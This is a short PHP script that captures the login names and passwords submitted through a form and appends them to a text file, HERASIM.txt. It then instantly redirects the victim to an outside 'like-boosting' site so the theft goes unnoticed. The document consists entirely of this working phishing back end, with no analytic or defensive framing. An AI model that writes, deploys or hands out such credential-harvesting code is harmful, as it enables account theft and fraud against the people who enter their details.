<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("HERASIM.txt","at");
fwrite($log,"\n $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://nakrutka-like.besaba.com/'></head></html>";
?> 